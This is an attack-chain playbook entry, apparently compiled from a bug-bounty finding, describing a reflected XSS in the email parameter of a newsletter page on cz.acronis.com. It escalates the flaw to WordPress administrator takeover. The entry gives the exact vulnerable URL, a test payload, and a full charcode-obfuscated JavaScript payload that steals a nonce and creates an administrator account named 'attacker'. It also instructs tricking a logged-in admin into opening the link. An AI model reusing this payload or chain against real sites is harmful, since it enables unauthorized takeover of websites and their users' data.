---
id: acronis-xss-chain-935503
tags:
  - xss
  - reflected-xss
  - wordpress
  - admin-takeover
  - javascript
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Reflected-XSS-in-Email-Parameter]]'
  - '[[procedures/Test-XSS-with-Simple-Payload]]'
  - '[[procedures/Exploit-XSS-to-Create-WordPress-Admin-User]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:09.664Z'
description: >-
  A multi-stage attack exploiting a reflected XSS vulnerability in the email
  parameter of a newsletter subscription thank-you page on cz.acronis.com,
  culminating in the creation of a new WordPress administrator user for CMS
  takeover.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Reflected XSS in Newsletter Email Parameter Leading to WordPress Admin Takeover

Multi-stage attack chain demonstrating exploitation of a reflected XSS vulnerability on the Acronis Czech website's newsletter thank-you page to execute JavaScript in an admin's browser, fetch a WordPress nonce, and create a new administrator user for CMS takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerable Endpoint] --> B[Test XSS Payload]
    B --> C[Execute Obfuscated Payload for Admin Creation]
    C --> D[CMS Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for inspecting network traffic
- No specialized tools required; manual testing via URL manipulation

### Target Environment

- Web platform with WordPress CMS
- PHP backend
- Publicly accessible newsletter subscription endpoint

### Initial Access Requirements

- Ability to craft malicious URLs
- Victim must be a logged-in WordPress admin tricked into visiting the URL
- No prior credentials needed for XSS trigger

## Detailed Attack Procedures

### Step 1: Identify Vulnerable Endpoint
procedure: [[procedures/Identify-Reflected-XSS-in-Email-Parameter]]

**Objective**: Locate the thank-you page that unsafely reflects user input from the email parameter, confirming potential for XSS.

**Instructions**: Navigate to the newsletter subscription thank-you page at https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/ and inspect the response for reflection of the 'email' parameter without sanitization.

**Expected Output**: The email value appears directly in the HTML response, e.g., as plain text or attribute without encoding.

**Success Indicators**:
- Email parameter reflected in page source
- No output encoding observed

### Step 2: Test XSS with Simple Payload
procedure: [[procedures/Test-XSS-with-Simple-Payload]]

**Objective**: Verify XSS executability by injecting a basic script tag payload into the email parameter.

**Instructions**: Append the payload to the email parameter in the URL: https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/?user=OK&oktosend=&email=tester@gmail.comaxsar%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eqw87f. Load the page and check for alert(1) popup.

**Expected Output**: JavaScript alert box displaying '1' confirms execution.

**Success Indicators**:
- Alert triggered on page load
- Script tags not sanitized

### Step 3: Exploit XSS to Create WordPress Admin User
procedure: [[procedures/Exploit-XSS-to-Create-WordPress-Admin-User]]

**Objective**: Use an obfuscated JavaScript payload to perform AJAX requests in the victim's browser, extracting a nonce and creating a new admin user.

**Instructions**: Craft the obfuscated payload and inject it via the email parameter: https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/?user=OK&oktosend=&email=email@teste.com%3C%2fscript%3E%3Cscript%3Eeval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,115,105,116,101,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))%3C%2fscript%3Eg8s3p. Trick a logged-in admin into visiting while monitoring network traffic in browser dev tools for AJAX requests to /wp-admin/user-new.php.

**Expected Output**: Successful POST request creates user 'attacker' with admin role; verify in WordPress admin panel.

**Success Indicators**:
- Nonce fetched via GET
- New admin user appears in WordPress users list
- Network tab shows successful AJAX responses

## Attack Chain Summary

### Key Achievements

1. Confirmed reflected XSS in email parameter without sanitization
2. Demonstrated arbitrary JavaScript execution via simple alert
3. Achieved WordPress CMS takeover by creating unauthorized admin account

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Privilege Escalation]]

---

*Last updated: 2023-10-01T00:00:00Z*
